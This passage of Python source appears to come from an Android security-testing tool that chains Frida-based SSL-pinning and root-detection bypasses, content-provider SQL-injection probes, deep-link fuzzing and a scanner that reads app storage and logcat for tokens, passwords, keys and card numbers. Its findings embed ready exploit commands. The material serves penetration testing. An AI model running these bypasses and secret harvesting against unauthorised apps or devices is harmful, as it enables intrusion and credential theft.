            f"dumpsys activity intents | grep -A 5 {self._package}"
        )
        if output:
            results.append(
                {
                    "type": "pending_intents",
                    "data": output[:500],
                }
            )

        return results


# ════════════════════════════════════════════════════════════════════════════
# MEMORY SCANNER
# ════════════════════════════════════════════════════════════════════════════


class MemoryScanner:
    """Scan app memory for sensitive data."""

    SENSITIVE_PATTERNS = {
        "jwt_token": re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}"),
        "bearer_token": re.compile(r"Bearer\s+[A-Za-z0-9_\-.~+/]+=*"),
        "api_key": re.compile(
            r"(?:api[_-]?key|apikey)\s*[=:]\s*['\"]?([a-zA-Z0-9_\-]{20,})"
        ),
        "email": re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"),
        "credit_card": re.compile(
            r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b"
        ),
        "password_field": re.compile(
            r"(?:password|passwd|pwd)\s*[=:]\s*['\"]?([^\s'\"]{6,})"
        ),
        "private_key": re.compile(r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----"),
        "url_with_creds": re.compile(r"https?://[^:]+:[^@]+@"),
    }

    def __init__(self, adb: ADBBridge, package_name: str) -> None:
        self._adb = adb
        self._package = package_name

    async def scan(self) -> MemoryScanResult:
        """Scan process memory for sensitive data."""
        result = MemoryScanResult()

        # Get PID
        pid_output = await self._adb.shell(f"pidof {self._package}")
        if not pid_output or not pid_output.strip().isdigit():
            logger.warning("Cannot find PID for %s", self._package)
            return result

        pid = pid_output.strip()

        # Dump memory maps
        maps_output = await self._adb.shell(f"cat /proc/{pid}/maps 2>/dev/null")
        if not maps_output:
            return result

        # Read heap sections
        heap_data = await self._adb.shell(
            f"cat /proc/{pid}/smaps 2>/dev/null | head -200"
        )

        # Dump app data files for analysis
        data_dir = f"/data/data/{self._package}"
        prefs_output = await self._adb.shell(
            f"find {data_dir}/shared_prefs -type f -name '*.xml' 2>/dev/null"
        )

        if prefs_output:
            for pref_file in prefs_output.strip().split("\n"):
                if pref_file.strip():
                    content = await self._adb.shell(
                        f"cat {shlex.quote(pref_file.strip())} 2>/dev/null"
                    )
                    if content:
                        self._scan_content(content, result, f"SharedPrefs: {pref_file}")

        # Scan databases
        db_output = await self._adb.shell(
            f"find {data_dir}/databases -type f -name '*.db' 2>/dev/null"
        )
        if db_output:
            for db_file in db_output.strip().split("\n"):
                if db_file.strip():
                    # Dump schema
                    schema = await self._adb.shell(
                        f"sqlite3 {shlex.quote(db_file.strip())} .schema 2>/dev/null"
                    )
                    if schema:
                        self._scan_content(schema, result, f"SQLite: {db_file}")

        # Scan logcat for sensitive data
        logcat = await self._adb.shell(f"logcat -d -t 500 | grep -i {self._package}")
        if logcat:
            self._scan_content(logcat, result, "Logcat")

        return result

    def _scan_content(
        self, content: str, result: MemoryScanResult, source: str
    ) -> None:
        """Scan content string for sensitive patterns."""
        for pattern_name, pattern in self.SENSITIVE_PATTERNS.items():
            for m in pattern.finditer(content):
                entry = {
                    "type": pattern_name,
                    "source": source,
                    "match": m.group(0)[:80],
                }

                if pattern_name in ("jwt_token", "bearer_token", "api_key"):
                    result.tokens_found.append(entry)
                elif pattern_name == "private_key":
                    result.keys_found.append(entry)
                elif pattern_name in ("email", "credit_card"):
                    result.pii_found.append(entry)
                elif pattern_name == "password_field":
                    result.passwords_found += 1
                elif pattern_name == "url_with_creds":
                    result.urls_found.append(m.group(0)[:100])


# ════════════════════════════════════════════════════════════════════════════
# SCREENSHOT ENGINE
# ════════════════════════════════════════════════════════════════════════════


class ScreenshotEngine:
    """Capture screenshots during sensitive operations."""

    def __init__(self, adb: ADBBridge, output_dir: str = "") -> None:
        self._adb = adb
        self._output_dir = output_dir or tempfile.mkdtemp(prefix="siren_screenshots_")

    async def capture(self, label: str = "screen") -> str:
        """Capture a screenshot and pull it locally."""
        timestamp = int(time.time())
        device_path = f"/sdcard/siren_{label}_{timestamp}.png"
        local_path = os.path.join(self._output_dir, f"{label}_{timestamp}.png")

        await self._adb.shell(f"screencap -p {device_path}")
        await self._adb.pull_file(device_path, local_path)
        await self._adb.shell(f"rm {device_path}")

        if os.path.isfile(local_path):
            return local_path
        return ""

    async def record(self, duration: int = 10, label: str = "record") -> str:
        """Record screen for a duration."""
        timestamp = int(time.time())
        device_path = f"/sdcard/siren_{label}_{timestamp}.mp4"
        local_path = os.path.join(self._output_dir, f"{label}_{timestamp}.mp4")

        # Start recording in background
        await self._adb.shell(
            f"screenrecord --time-limit {min(duration, 180)} {device_path} &"
        )
        await asyncio.sleep(duration + 2)

        await self._adb.pull_file(device_path, local_path)
        await self._adb.shell(f"rm {device_path}")

        if os.path.isfile(local_path):
            return local_path
        return ""


# ════════════════════════════════════════════════════════════════════════════
# MAIN DYNAMIC ANALYZER
# ════════════════════════════════════════════════════════════════════════════


class SirenDynamicAnalyzer:
    """Complete dynamic analysis orchestrator.

    Performs runtime security testing via:
    - Frida instrumentation (SSL, root, crypto, storage, network hooks)
    - Content provider exploitation
    - Deep link fuzzing
    - Broadcast injection
    - IPC exploitation
    - Memory scanning
    - Screenshot capture
    """

    VERSION = "1.0.0"

    def __init__(
        self,
        adb: ADBBridge,
        frida: FridaEngine,
        package_name: str,
        config: Optional[MobileTestConfig] = None,
    ) -> None:
        self.adb = adb
        self.frida = frida
        self.package = package_name
        self.config = config or MobileTestConfig()
        self._script_lib = FridaScriptLibrary()
        self._findings: List[MobileFinding] = []
        self._hooks: List[HookResult] = []
        self._messages: List[Dict[str, Any]] = []

    async def run_full_analysis(
        self,
        manifest_data: Optional[Dict[str, Any]] = None,
    ) -> DynamicTestResult:
        """Run comprehensive dynamic analysis."""
        start = time.time()
        result = DynamicTestResult(package_name=self.package)

        logger.info("[SIREN Dynamic] Starting analysis for %s", self.package)

        # Attach to process
        if not await self.frida.attach(self.package):
            logger.warning("Frida attach failed — running ADB-only tests")

        manifest = manifest_data or {}

        # Phase 1: Install Frida hooks
        await self._phase_hooks()

        # Phase 2: SSL pinning bypass
        await self._phase_ssl_bypass(result)

        # Phase 3: Root detection bypass
        await self._phase_root_bypass(result)

        # Phase 4: Crypto monitoring
        await self._phase_crypto_monitor(result)

        # Phase 5: Content provider exploitation
        providers = manifest.get("providers", [])
        exported_providers = [p["name"] for p in providers if p.get("exported")]
        if exported_providers:
            await self._phase_content_providers(result, exported_providers)

        # Phase 6: Deep link fuzzing
        schemes = manifest.get("custom_schemes", [])
        deeplinks = manifest.get("deeplinks", [])
        activities = [
            a["name"] for a in manifest.get("activities", []) if a.get("exported")
        ]
        if schemes or deeplinks or activities:
            await self._phase_deeplinks(result, schemes, deeplinks, activities)

        # Phase 7: Broadcast exploitation
        receivers = manifest.get("receivers", [])
        if receivers:
            await self._phase_broadcasts(result, receivers)

        # Phase 8: IPC exploitation
        services = manifest.get("services", [])
        if services:
            await self._phase_ipc(result, services)

        # Phase 9: Memory scan
        await self._phase_memory_scan(result)

        # Phase 10: Screenshot sensitive screens
        await self._phase_screenshots(result)

        # Collect Frida messages into findings
        self._process_frida_messages(result)

        # Detach
        await self.frida.detach()

        result.findings = self._findings
        result.hooks_applied = self._hooks
        result.duration = time.time() - start

        logger.info(
            "[SIREN Dynamic] Complete: %d findings, %d hooks, %.1fs",
            len(result.findings),
            len(result.hooks_applied),
            result.duration,
        )

        return result

    # ── Phase implementations ──────────────────────────────────────────

    async def _phase_hooks(self) -> None:
        """Install base monitoring hooks."""
        scripts = [
            ("storage", self._script_lib.storage_monitor()),
            ("network", self._script_lib.network_monitor()),
            ("logging", self._script_lib.logging_capture()),
            ("lifecycle", self._script_lib.activity_lifecycle_monitor()),
        ]

        for name, script in scripts:
            success = await self.frida.inject_script(
                script,
                on_message=lambda msg, name=name: self._on_frida_message(msg, name),
            )
            if success:
                self._hooks.append(
                    HookResult(
                        hook_type=(
                            HookType.STORAGE if name == "storage" else HookType.NETWORK
                        ),
                        success=True,
                        method_hooked=name,
                        timestamp=time.time(),
                    )
                )

        # Let hooks settle
        await asyncio.sleep(2)

    async def _phase_ssl_bypass(self, result: DynamicTestResult) -> None:
        """Bypass SSL pinning."""
        logger.info("[SIREN Dynamic] Phase: SSL pinning bypass")

        script = self._script_lib.ssl_pinning_bypass_universal()
        success = await self.frida.inject_script(
            script,
            on_message=lambda msg: self._on_frida_message(msg, "ssl"),
        )

        hook = HookResult(
            hook_type=HookType.SSL_PINNING,
            success=success,
            method_hooked="ssl_pinning_bypass_universal",
            timestamp=time.time(),
        )
        self._hooks.append(hook)

        if success:
            self._findings.append(
                MobileFinding(
                    title="SSL pinning bypass successful",
                    severity=SecurityLevel.HIGH,
                    owasp_category="M5",
                    description=(
                        "SSL/TLS certificate pinning was successfully bypassed using "
                        "Frida instrumentation. Targets: TrustManager, OkHttp3, "
                        "Conscrypt, WebView, NetworkSecurityPolicy."
                    ),
                    evidence="Frida SSL bypass script injected and active",
                    remediation=(
                        "Implement multi-layer pinning: OkHttp + NetworkSecurityConfig "
                        "+ custom TrustManager + runtime integrity checks."
                    ),
                    cwe="CWE-295",
                    cvss=7.0,
                    poc="frida -U -l ssl_bypass.js -f " + self.package,
                    tags=["dynamic", "ssl-pinning", "frida"],
                )
            )

    async def _phase_root_bypass(self, result: DynamicTestResult) -> None:
        """Bypass root detection."""
        logger.info("[SIREN Dynamic] Phase: Root detection bypass")

        script = self._script_lib.root_detection_bypass()
        success = await self.frida.inject_script(
            script,
            on_message=lambda msg: self._on_frida_message(msg, "root"),
        )

        hook = HookResult(
            hook_type=HookType.ROOT_DETECTION,
            success=success,
            method_hooked="root_detection_bypass",
            timestamp=time.time(),
        )
        self._hooks.append(hook)

        if success:
            self._findings.append(
                MobileFinding(
                    title="Root detection bypass successful",
                    severity=SecurityLevel.MEDIUM,
                    owasp_category="M8",
                    description=(
                        "Root/jailbreak detection was bypassed: RootBeer, File.exists, "
                        "Build.TAGS, SystemProperties, PackageManager checks."
                    ),
                    evidence="Frida root bypass script active",
                    remediation=(
                        "Use multiple detection layers: native checks, integrity "
                        "verification, SafetyNet/Play Integrity attestation."
                    ),
                    cwe="CWE-693",
                    poc="frida -U -l root_bypass.js -f " + self.package,
                    tags=["dynamic", "root-detection", "frida"],
                )
            )

    async def _phase_crypto_monitor(self, result: DynamicTestResult) -> None:
        """Monitor cryptographic operations."""
        logger.info("[SIREN Dynamic] Phase: Crypto monitoring")

        script = self._script_lib.crypto_monitor()
        success = await self.frida.inject_script(
            script,
            on_message=lambda msg: self._on_frida_message(msg, "crypto"),
        )

        self._hooks.append(
            HookResult(
                hook_type=HookType.CRYPTO,
                success=success,
                method_hooked="crypto_monitor",
                timestamp=time.time(),
            )
        )

        # Give crypto hooks time to capture operations
        await asyncio.sleep(3)

    async def _phase_content_providers(
        self, result: DynamicTestResult, providers: List[str]
    ) -> None:
        """Exploit content providers."""
        logger.info("[SIREN Dynamic] Phase: Content provider exploitation")

        exploiter = ContentProviderExploiter(self.adb, self.package)
        cp_results = await exploiter.enumerate_providers(providers)
        result.content_providers = cp_results

        for cp in cp_results:
            if cp.sql_injectable:
                self._findings.append(
                    MobileFinding(
                        title=f"SQL injection in content provider: {cp.uri}",
                        severity=SecurityLevel.CRITICAL,
                        owasp_category="M4",
                        description=(
                            f"Content provider at {cp.uri} is vulnerable to SQL injection. "
                            f"Returned {cp.rows_returned} rows with injection payload."
                        ),
                        evidence=f"URI: {cp.uri}, Columns: {cp.columns}",
                        remediation="Use parameterized queries in ContentProvider.query(). Validate selection arguments.",
                        cwe="CWE-89",
                        cvss=9.0,
                        poc=f'adb shell content query --uri {cp.uri} --where "1=1"',
                        tags=["dynamic", "content-provider", "sqli"],
                    )
                )

            if cp.path_traversal:
                self._findings.append(
                    MobileFinding(
                        title=f"Path traversal in content provider: {cp.uri}",
                        severity=SecurityLevel.CRITICAL,
                        owasp_category="M4",
                        description=f"Content provider at {cp.uri} is vulnerable to path traversal.",
                        evidence=f"URI: {cp.uri}",
                        remediation="Validate and canonicalize paths in openFile(). Block '..' sequences.",
                        cwe="CWE-22",
                        cvss=8.5,
                        tags=["dynamic", "content-provider", "path-traversal"],
                    )
                )

            if cp.queryable and not cp.sql_injectable and not cp.path_traversal:
                self._findings.append(
                    MobileFinding(
                        title=f"Queryable content provider: {cp.uri}",
                        severity=SecurityLevel.MEDIUM,
                        owasp_category="M3",
                        description=(
                            f"Content provider at {cp.uri} returns data ({cp.rows_returned} rows). "
                            f"Columns: {', '.join(cp.columns[:10])}"
                        ),
                        evidence=json.dumps(cp.sample_data[:2], default=str),
                        remediation="Add permission protection or set exported=false.",
                        cwe="CWE-284",
                        tags=["dynamic", "content-provider", "data-exposure"],
                    )
                )

    async def _phase_deeplinks(
        self,
        result: DynamicTestResult,
        schemes: List[str],
        deeplinks: List[str],
        activities: List[str],
    ) -> None:
        """Fuzz deep links."""
        logger.info("[SIREN Dynamic] Phase: Deep link fuzzing")

        fuzzer = DeepLinkFuzzer(self.adb, self.package)
        dl_results = await fuzzer.fuzz_deeplinks(schemes, deeplinks, activities)
        result.deeplinks_tested = dl_results

        for dl in dl_results:
            if dl.crash:
                self._findings.append(
                    MobileFinding(
                        title=f"Deep link crash: {dl.uri[:80]}",
                        severity=SecurityLevel.HIGH,
                        owasp_category="M3",
                        description=f"Deep link caused application crash: {dl.uri}",
                        evidence=f"URI: {dl.uri}, Target: {dl.target_activity}",
                        remediation="Add input validation to deep link handler. Handle malformed URIs gracefully.",
                        cwe="CWE-20",
                        cvss=6.5,
                        poc=f'adb shell am start -a android.intent.action.VIEW -d "{dl.uri}"',
                        tags=["dynamic", "deeplink", "crash"],
                    )
                )

            if dl.auth_bypass:
                self._findings.append(
                    MobileFinding(
                        title=f"Auth bypass via activity launch: {dl.target_activity}",
                        severity=SecurityLevel.CRITICAL,
                        owasp_category="M3",
                        description=f"Activity {dl.target_activity} can be launched directly without authentication.",
                        evidence=f"Activity: {dl.target_activity}",
                        remediation="Add authentication check in Activity.onCreate(). Set exported=false.",
                        cwe="CWE-287",
                        cvss=9.0,
                        poc=f"adb shell am start -n {self.package}/{dl.target_activity}",
                        tags=["dynamic", "deeplink", "auth-bypass"],
                    )
                )

    async def _phase_broadcasts(
        self, result: DynamicTestResult, receivers: List[Dict[str, Any]]
    ) -> None:
        """Test broadcast receivers."""
        logger.info("[SIREN Dynamic] Phase: Broadcast exploitation")

        exploiter = BroadcastExploiter(self.adb, self.package)
        bc_results = await exploiter.test_receivers(receivers)
        result.broadcast_results = bc_results

        for bc in bc_results:
            if bc.get("accepted") and not bc.get("permission"):
                self._findings.append(
                    MobileFinding(
                        title=f"Unprotected broadcast receiver: {bc['receiver']}",
                        severity=SecurityLevel.MEDIUM,
                        owasp_category="M3",
                        description=f"Broadcast receiver {bc['receiver']} accepts broadcasts without permission.",
                        evidence=f"Receiver: {bc['receiver']}, Response: {bc.get('response', '')[:100]}",
                        remediation="Add android:permission to receiver or set exported=false.",
                        cwe="CWE-926",
                        tags=["dynamic", "broadcast", "unprotected"],
                    )
                )

    async def _phase_ipc(
        self, result: DynamicTestResult, services: List[Dict[str, Any]]
    ) -> None:
        """Test IPC channels."""
        logger.info("[SIREN Dynamic] Phase: IPC exploitation")

        engine = IPCExploitEngine(self.adb, self.package)
        ipc_results = await engine.test_services(services)
        result.ipc_results = ipc_results

        for ipc in ipc_results:
            if ipc.get("startable") and not ipc.get("permission"):
                self._findings.append(
                    MobileFinding(
                        title=f"Unprotected exported service: {ipc['service']}",
                        severity=SecurityLevel.MEDIUM,
                        owasp_category="M3",
                        description=f"Service {ipc['service']} can be started by any app.",
                        evidence=f"Service: {ipc['service']}",
                        remediation="Add permission protection or set exported=false.",
                        cwe="CWE-926",
                        tags=["dynamic", "ipc", "service"],
                    )
                )

        # PendingIntent check
        pi_results = await engine.test_pending_intents()
        result.ipc_results.extend(pi_results)

    async def _phase_memory_scan(self, result: DynamicTestResult) -> None:
        """Scan memory for sensitive data."""
        logger.info("[SIREN Dynamic] Phase: Memory scanning")

        scanner = MemoryScanner(self.adb, self.package)
        mem_result = await scanner.scan()
        result.memory_scan = mem_result

        if mem_result.tokens_found:
            self._findings.append(
                MobileFinding(
                    title=f"Tokens in memory/storage: {len(mem_result.tokens_found)}",
                    severity=SecurityLevel.HIGH,
                    owasp_category="M9",
                    description=(
                        f"Found {len(mem_result.tokens_found)} authentication tokens "
                        f"in app storage/logs."
                    ),
                    evidence=json.dumps(mem_result.tokens_found[:3], default=str),
                    remediation="Store tokens in Android Keystore. Clear from memory after use.",
                    cwe="CWE-312",
                    tags=["dynamic", "memory", "tokens"],
                )
            )

        if mem_result.keys_found:
            self._findings.append(
                MobileFinding(
                    title=f"Private keys in storage: {len(mem_result.keys_found)}",
                    severity=SecurityLevel.CRITICAL,
                    owasp_category="M9",
                    description=f"Found {len(mem_result.keys_found)} private keys in app storage.",
                    evidence=json.dumps(mem_result.keys_found[:2], default=str),
                    remediation="Never store private keys in files. Use Android KeyStore.",
                    cwe="CWE-321",
                    cvss=9.0,
                    tags=["dynamic", "memory", "private-keys"],
                )
            )

        if mem_result.pii_found:
            self._findings.append(
                MobileFinding(
                    title=f"PII in storage: {len(mem_result.pii_found)}",
                    severity=SecurityLevel.MEDIUM,
                    owasp_category="M9",
                    description=f"Found {len(mem_result.pii_found)} PII items in app storage.",
                    evidence=json.dumps(mem_result.pii_found[:3], default=str),
                    remediation="Encrypt PII data at rest. Use EncryptedSharedPreferences.",
                    cwe="CWE-312",
                    tags=["dynamic", "memory", "pii"],
                )
            )

        if mem_result.passwords_found > 0:
            self._findings.append(
                MobileFinding(
                    title=f"Passwords in storage/logs: {mem_result.passwords_found}",
                    severity=SecurityLevel.CRITICAL,
                    owasp_category="M9",
                    description=f"Found {mem_result.passwords_found} password references in storage/logs.",
                    evidence=f"Password references: {mem_result.passwords_found}",
                    remediation="Never log or store passwords. Use hashing + Android Keystore.",
                    cwe="CWE-256",
                    cvss=8.5,
                    tags=["dynamic", "memory", "passwords"],
                )
            )

    async def _phase_screenshots(self, result: DynamicTestResult) -> None:
        """Capture screenshots of sensitive screens."""
        logger.info("[SIREN Dynamic] Phase: Screenshot capture")

        engine = ScreenshotEngine(self.adb)

        # Capture current screen
        path = await engine.capture("current_state")
        if path:
            result.screenshots.append(path)

        # Navigate to common sensitive screens
        sensitive_activities = [
            "LoginActivity",
            "SettingsActivity",
            "ProfileActivity",
            "PaymentActivity",
            "AccountActivity",
        ]
        for activity in sensitive_activities:
            full_name = f"{self.package}.{activity}"
            cmd = f"am start -n {self.package}/{full_name} 2>&1"
            output = await self.adb.shell(cmd)

            if output and "Error" not in output:
                await asyncio.sleep(1)
                path = await engine.capture(activity.lower())
                if path:
                    result.screenshots.append(path)

        # Check if app prevents screenshots
        flag_check = await self.adb.shell(
            f"dumpsys window | grep -A 3 {self.package} | grep -i secure"
        )
        if not flag_check or "FLAG_SECURE" not in (flag_check or ""):
            self._findings.append(
                MobileFinding(
                    title="No screenshot protection (FLAG_SECURE)",
                    severity=SecurityLevel.MEDIUM,
                    owasp_category="M9",
                    description="App does not set FLAG_SECURE on sensitive screens.",
                    evidence="dumpsys window: FLAG_SECURE not found",
                    remediation="Add getWindow().setFlags(FLAG_SECURE, FLAG_SECURE) to sensitive Activities.",
                    cwe="CWE-200",
                    tags=["dynamic", "screenshot", "flag-secure"],
                )
            )

    # ── Frida message handler ──────────────────────────────────────────

    def _on_frida_message(self, message: Dict[str, Any], source: str) -> None:
        """Process Frida script messages."""
        if isinstance(message, dict):
            message["_source"] = source
            message["_time"] = time.time()
            self._messages.append(message)

    def _process_frida_messages(self, result: DynamicTestResult) -> None:
        """Convert Frida messages to findings."""
        crypto_vulns: Set[str] = set()
        network_vulns: Set[str] = set()
        storage_vulns: Set[str] = set()
        webview_vulns: Set[str] = set()
        logging_vulns: List[Dict[str, Any]] = []

        for msg in self._messages:
            if not isinstance(msg, dict):
                continue

            msg_payload = msg.get("payload", msg)
            if not isinstance(msg_payload, dict):
                continue

            msg_type = msg_payload.get("type", "")

            if msg_type == "crypto_vuln":
                issue = msg_payload.get("issue", "")
                algo = msg_payload.get("algorithm", "")
                key = f"{issue}:{algo}"
                if key not in crypto_vulns:
                    crypto_vulns.add(key)
                    sev = (
                        SecurityLevel.HIGH
                        if issue in ("weak_algorithm", "hardcoded_key")
                        else SecurityLevel.MEDIUM
                    )
                    self._findings.append(
                        MobileFinding(
                            title=f"Runtime crypto issue: {issue}",
                            severity=sev,
                            owasp_category="M10",
                            description=f"Crypto vulnerability at runtime: {issue} ({algo})",
                            evidence=json.dumps(msg_payload, default=str)[:200],
                            remediation="Use AES-256-GCM, SecureRandom, Android Keystore.",
                            cwe="CWE-327",
                            tags=["dynamic", "crypto", issue],
                        )
                    )

            elif msg_type == "network_vuln":
                url = msg_payload.get("url", "")
                if url not in network_vulns:
                    network_vulns.add(url)
                    self._findings.append(
                        MobileFinding(
                            title=f"Cleartext HTTP: {url[:60]}",
                            severity=SecurityLevel.MEDIUM,
                            owasp_category="M5",
                            description=f"Runtime cleartext HTTP request detected: {url}",
                            evidence=url[:150],
                            remediation="Use HTTPS for all network traffic.",
                            cwe="CWE-319",
                            tags=["dynamic", "network", "cleartext"],
                        )
                    )

            elif msg_type == "storage_vuln":
                issue = msg_payload.get("issue", "")
                key = msg_payload.get("key", issue)
                if key not in storage_vulns:
                    storage_vulns.add(key)
                    self._findings.append(
                        MobileFinding(
                            title=f"Storage issue: {issue}",
                            severity=SecurityLevel.MEDIUM,
                            owasp_category="M9",
                            description=msg_payload.get("detail", issue),
                            evidence=json.dumps(msg_payload, default=str)[:200],
                            remediation="Encrypt sensitive data. Use EncryptedSharedPreferences/Android Keystore.",
                            cwe="CWE-312",
                            tags=["dynamic", "storage", issue],
                        )
                    )

            elif msg_type == "webview_vuln":
                issue = msg_payload.get("issue", "")
                if issue not in webview_vulns:
                    webview_vulns.add(issue)
                    sev = (
                        SecurityLevel.HIGH
                        if "access" in issue
                        else SecurityLevel.MEDIUM
                    )
                    self._findings.append(
                        MobileFinding(
                            title=f"WebView runtime: {issue}",
                            severity=sev,
                            owasp_category="M4",
                            description=f"WebView security issue detected at runtime: {issue}",
                            evidence=json.dumps(msg_payload, default=str)[:200],
                            remediation="Disable unnecessary WebView features.",
                            cwe="CWE-749",
                            tags=["dynamic", "webview", issue],
                        )
                    )

            elif msg_type == "logging_vuln":
                logging_vulns.append(msg_payload)

        # Aggregate logging findings
        if logging_vulns:
            self._findings.append(
                MobileFinding(
                    title=f"Sensitive data in logs: {len(logging_vulns)} instances",
                    severity=SecurityLevel.MEDIUM,
                    owasp_category="M9",
                    description=(
                        f"Found {len(logging_vulns)} log entries containing sensitive data "
                        f"(tokens, passwords, keys, PII)."
                    ),
                    evidence=json.dumps(logging_vulns[:3], default=str)[:300],
                    remediation="Remove all logging of sensitive data. Use ProGuard to strip Log calls.",
                    cwe="CWE-532",
                    tags=["dynamic", "logging", "sensitive-data"],
                )
            )
